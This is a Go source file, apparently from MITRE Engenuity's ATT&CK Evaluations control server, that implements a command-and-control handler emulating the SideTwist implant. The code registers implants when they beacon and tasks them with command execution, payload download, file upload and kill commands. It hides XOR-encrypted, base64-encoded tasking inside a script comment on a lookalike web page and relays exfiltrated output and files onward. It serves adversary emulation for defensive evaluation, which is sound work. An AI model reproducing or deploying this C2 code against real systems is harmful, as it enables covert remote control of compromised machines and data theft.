package sidetwist

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"
	"github.com/gorilla/mux"
)

const (
	serverErrMsg = "Internal server error\n"
	cmdIdExec = "101"
	cmdIdDownload = "102"
	cmdIdUpload = "103"
	cmdIdExecAlt = "104"
	cmdIdKill = "105"
	defaultHtmlTemplatePath = "handlers/sidetwist/templates/home.html"
	defaultLogoPath = "handlers/sidetwist/templates/logo.png"
	embedPlaceholder = "<script></script>"
	embedFormat = "<script>/*%s*/</script>"
)

var (
	xorKey = []byte{ 0x6e, 0x6f, 0x74, 0x6d, 0x65, 0x72, 0x73, 0x65, 0x6e, 0x6e, 0x65 }
	keyLen = len(xorKey)
)

// Wrapper type that represents a function that will take a server response and template and embed the response as needed
type responseWrapperFunc func(string, string) (string, error)

// Wrapper type that represents an encryption or decryption function
type encryptFunc func ([]byte) []byte

// Represents the Sidetwist C2 handler. Will implement the util.Handler interface.
type SideTwistHandler struct {
	restAPIaddress string
	server *http.Server
	listenAddress string
	templatePath string
	htmlTemplate string
	commandNumbers map[string]int // maps known implant GUIDs to the next command number available (starting with 1)
	pendingCommandOutput map[string]map[int]bool // maps implant GUIDs to a map linking command numbers to boolean indicating if we're waiting on output for that command
	pendingUploads map[string]map[int]string // maps implant GUIDs to a map linking command numbers to string indicating upload file name.
	responseWrapper responseWrapperFunc
	encryptFn encryptFunc
	decryptFn encryptFunc
}

// Factory method for creating a SideTwistHandler
func sideTwistHandlerFactory(responseWrapper responseWrapperFunc, templatePath string, encryptFn, decryptFn encryptFunc) *SideTwistHandler {
	return &SideTwistHandler{
		templatePath: templatePath,
		commandNumbers: make(map[string]int),
		pendingCommandOutput: make(map[string]map[int]bool),
		pendingUploads: make(map[string]map[int]string),
		responseWrapper: responseWrapper,
		encryptFn: encryptFn,
		decryptFn: decryptFn,
	}
}

// Takes the base64 response string and embeds it in the lookalike html page
func htmlResponseWrapper(toEmbed string, template string) (string, error) {
	if strings.Contains(template, embedPlaceholder) {
		formattedEmbed := fmt.Sprintf(embedFormat, toEmbed)
		return strings.Replace(template, embedPlaceholder, formattedEmbed, 1), nil
	}
	return "", errors.New("Invalid template - missing the placeholder for the embedded response")
}

// Returns the base64 response string as is
func basicResponseWrapper(toEmbed string, template string) (string, error) {
	return toEmbed, nil
}

// Assumes no encryption happens, so it just returns the plaintext
func noEncrypt(data []byte) []byte {
	return data
}

// XOR encryption
func xorEncrypt(data []byte) []byte {
	retBuf := make([]byte, len(data))
	for index, dataByte := range data {
		retBuf[index] = dataByte ^ xorKey[index % keyLen]
	}
	return retBuf
}

// Creates and adds the SideTwistHandler to the map of available C2 handlers.
func init() {
	util.AvailableHandlers["sidetwist"] = sideTwistHandlerFactory(htmlResponseWrapper, defaultHtmlTemplatePath, xorEncrypt, xorEncrypt)
}

// StartHandler starts the SideTwist server
func (s *SideTwistHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
	listenAddress, err := config.GetHostPortString(configEntry)
	if err != nil {
		return err
	}
	s.listenAddress = listenAddress
	logger.Info("Starting SideTwist Handler")

	// make sure we know the REST API address
	s.restAPIaddress = restAddress
	
	// make sure we can access the HTML template page for responses
	templateData, err := ioutil.ReadFile(s.templatePath)
	if err != nil {
		return err
	}
	s.htmlTemplate = string(templateData)

	// initialize URL router
	urlRouter := mux.NewRouter()

	s.server = &http.Server{
		Addr:         s.listenAddress,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      urlRouter,
	}

	// bind HTTP routes to their functions
	urlRouter.HandleFunc("/search/{identifier}", s.handleBeacon).Methods("GET")
	urlRouter.HandleFunc("/search/{identifier}", s.handleResponse).Methods("POST")
	urlRouter.HandleFunc("/getFile/{filename}", s.downloadFile).Methods("GET")
	urlRouter.HandleFunc("/logo.png", fetchLogo).Methods("GET")
	
	// start handler in goroutine so it doesn't block
	go func() {
		err := s.server.ListenAndServe()
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()
	return nil
}

// StopHandler stops the SideTwist server
func (s *SideTwistHandler) StopHandler() error {
	logger.Info("Killing Server")
	emptyContext := context.Background()
	return s.server.Shutdown(emptyContext)
}

func (s *SideTwistHandler) handleBeacon(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	var response string
	var err error
	task := ""
	guid, ok := vars["identifier"]
	if !ok {
		logger.Error("Identifier not included in GET request to /search/{identifier}")
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}
	if !s.hasImplantSession(guid) {
		logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session.", guid))
		err = s.registerNewImplant(guid)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to register implant session: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
		task, err = s.getBootstrapTask()
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to get bootstrap task for implant: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
		logger.Info(fmt.Sprintf("Received bootstrap task %s", task))
	} else {
		logger.Info(fmt.Sprintf("Received beacon from %s", guid))
		task, err = forwardGetTask(s.restAPIaddress, guid)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
	}
	response, err = s.convertTaskToResponse(guid, task)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to convert implant task to response: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}
	logger.Info(fmt.Sprintf("Tasking implant %s with task: %s", guid, task))
	fmt.Fprint(w, response)
}

// Fetches the currently set bootstrap task from the REST server
func (s *SideTwistHandler) getBootstrapTask() (string, error) {
	url := "http://" + s.restAPIaddress + "/api/v1.0/bootstraptask/sidetwist"

	response, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func fetchLogo(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, defaultLogoPath)
}

func (s *SideTwistHandler) registerNewImplant(guid string) error {
	implantData := createNewSessionDataBytes(guid)
	restResponse, err := forwardRegisterImplant(s.restAPIaddress, implantData)
	if err != nil {
		return err
	}
	if err = s.storeImplantSession(guid); err != nil {
		return err
	}
	logger.Info(restResponse)
	logger.Success(fmt.Sprintf("Successfully created session for implant %s.", guid))
	return nil
}

// Process POST requests containing command output or file uploads.
func (s *SideTwistHandler) handleResponse(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	guid, ok := vars["identifier"]
	if !ok {
		logger.Error("Identifier not included in POST request to /search/{identifier}")
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte(serverErrMsg))
		return
	}
	postBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to read POST body: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}
	response, err := s.processAndForwardImplantOutput(guid, postBody)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}
	logger.Success(response)
	fmt.Fprint(w, "")
}

func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// Query the REST API for tasks for the implant with the specified GUID.
func forwardGetTask(restAPIaddress string, guid string) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/task/" + guid
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	sessionData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

// Pulls out the task output from the JSON body and forwards it to the REST API server.
func (s *SideTwistHandler) processAndForwardImplantOutput(guid string, data []byte) (string, error) {
	var commandOutput []byte
	var err error
	
	_, pendingOutput := s.pendingCommandOutput[guid]
	_, pendingUpload := s.pendingUploads[guid]
	if !(pendingOutput || pendingUpload) {
		return "", errors.New(fmt.Sprintf("Implant %s does not have any tasks pending output.", guid))
	}
	
	// Extract command output from data
	outputJson := make(map[int]string)
	if err = json.Unmarshal(data, &outputJson); err != nil {
		return "", err
	}
	
	// We should only have one command output
	for commandNum, encodedOutput := range outputJson {
		logger.Info(fmt.Sprintf("Processing output for task %d for implant %s", commandNum, guid))
		commandOutput, err = s.decodeAndDecrypt(encodedOutput)
		if err != nil {
			return "", err
		}
		if pending, ok := s.pendingCommandOutput[guid][commandNum]; ok && pending {
			s.pendingCommandOutput[guid][commandNum] = false
			return s.forwardTaskOutput(guid, commandOutput)
		} else {
			if fileName, ok := s.pendingUploads[guid][commandNum]; ok {
				return s.forwardUpload(fileName, commandOutput)
			} else {
				return "", errors.New(fmt.Sprintf("Implant %s does not have task %d pending output.", guid, commandNum))
			}
		}
		break
	}
	return "", errors.New(fmt.Sprintf("Implant %s did not provide any output.", guid))
}

func (s *SideTwistHandler) forwardUpload(fileName string, data []byte) (string, error) {
	if len(fileName) == 0 {
		return "", errors.New("Implant upload task provided empty filename")
	}
	url := "http://" + s.restAPIaddress + "/api/v1.0/upload/" + fileName
	resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(result), err
}

func (s *SideTwistHandler) forwardTaskOutput(guid string, data []byte) (string, error) {
	url := "http://" + s.restAPIaddress + "/api/v1.0/task/output/" + guid
	
	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

// Returns true if the handler has seen this implant, false otherwise
func (s *SideTwistHandler) hasImplantSession(guid string) bool {
	_, ok := s.commandNumbers[guid]
	return ok
}

func (s *SideTwistHandler) storeImplantSession(guid string) error {
	if s.hasImplantSession(guid) {
		return errors.New(fmt.Sprintf("Session %s already exists.", guid))
	}
	s.commandNumbers[guid] = 1
	s.pendingCommandOutput[guid] = make(map[int]bool)
	s.pendingUploads[guid] = make(map[int]string)
	return nil
}

// Returns bytes representing JSON dict containing specified implant GUID.
func createNewSessionDataBytes(guid string) []byte {
	jsonStr, err := json.Marshal(map[string]string{ "guid": guid })
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to create JSON info for session for GUID %s: %s", guid, err.Error()))
		return nil
	}
	return []byte(jsonStr)
}

// Converts given task string for the implant with GUID to a base64-encoded and XOR-encrypted string of the format "command number | commmand ID | base64(arg1|arg2)"
// Note that "arg2" only exists for payload downloads. Entire command strings are treated as the single argument "arg1".
func (s *SideTwistHandler) convertTaskToResponse(guid, task string) (string, error) {
	if !s.hasImplantSession(guid) {
		return "", errors.New(fmt.Sprintf("No existing session for implant %s.", guid))
	}
	if _, ok := s.pendingCommandOutput[guid]; !ok {
		s.pendingCommandOutput[guid] = make(map[int]bool)
	}
	if _, ok := s.pendingUploads[guid]; !ok {
		s.pendingUploads[guid] = make(map[int]string)
	}
	commandNum := -1
	commandId := ""
	commandStr := ""
	encodedCommand := ""
	var err error
	if len(task) > 0 {
		commandId, commandStr, err = extractIdAndCommand(task)
		if err != nil {
			return "", err
		}
		commandNum = s.commandNumbers[guid]
		if commandId == cmdIdExec || commandId == cmdIdExecAlt || commandId == cmdIdDownload {
			s.pendingCommandOutput[guid][commandNum] = true
		} else if commandId == cmdIdKill {
			s.pendingCommandOutput[guid][commandNum] = false
		} else if commandId == cmdIdUpload {
			s.pendingUploads[guid][commandNum] = getLeaf(commandStr)
		} else {
			return "", errors.New(fmt.Sprintf("Received task with unsupported command ID: %s", commandId))
		}
		encodedCommand = base64.StdEncoding.EncodeToString([]byte(commandStr))
		s.commandNumbers[guid] = commandNum + 1
	}
	response := fmt.Sprintf("%d|%s|%s", commandNum, commandId, encodedCommand)
	encodedEncrypted := s.encryptAndEncode([]byte(response))
	logger.Info(fmt.Sprintf("Assigning task #%d to the implant with id %s and command: %s", commandNum, commandId, commandStr))
	return s.responseWrapper(encodedEncrypted, s.htmlTemplate)
}

// Given a task string, parses out the command ID and the command string.
func extractIdAndCommand(task string) (string, string, error) {
	trimmedTask := strings.TrimSpace(task)
	tokens := strings.Split(trimmedTask, " ")
	if len(tokens) < 2 && tokens[0] != cmdIdKill {
		return "", "", errors.New(fmt.Sprintf("Task requires command ID and command arg. Provided: %s", task))
	}
	commandId := tokens[0]
	command := trimmedTask[len(commandId):]
	return commandId, strings.TrimSpace(command), nil
}

// Downloads the requested file from the control server.
func (s *SideTwistHandler) downloadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	filename := vars["filename"]
	logger.Info("SideTwist handler received file download request for payload: " + filename)
	fileData, err := s.forwardGetFileFromServer(filename)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to perform file download request: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(s.encryptAndEncode(fileData)))
}

// XOR-encrypts data and returns base64-encoded string of the result
func (s *SideTwistHandler) encryptAndEncode(data []byte) string {
	encryptedData := s.encryptFn(data)
	return base64.StdEncoding.EncodeToString(encryptedData)
}

// base64-decodes the and XOR-decrypts the input and returns underlying data
func (s *SideTwistHandler) decodeAndDecrypt(encodedStr string) ([]byte, error) {
	decodedData, err := base64.StdEncoding.DecodeString(encodedStr)
	if err != nil {
		return nil, err
	}
	return s.decryptFn(decodedData), nil
}

// Receiving file from the control server. If the file does not exist, an error response is returned.
func (s *SideTwistHandler) forwardGetFileFromServer(fileName string) ([]byte, error) {
	url := "http://" + s.restAPIaddress + "/api/v1.0/files/SideTwist/" + fileName
	resp, err := http.Get(url)
	var filedata []byte
	if err != nil {
		return filedata, err
	}
	if resp.StatusCode != 200 {
		return filedata, errors.New("server did not return requested file: " + fileName)
	}
	filedata, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return filedata, err
	}
	return filedata, nil
}

func getLeaf(path string) string {
	tokens := strings.Split(path, "\\")
	leaf := tokens[len(tokens)-1]
	return strings.Trim(leaf, "\"")
}
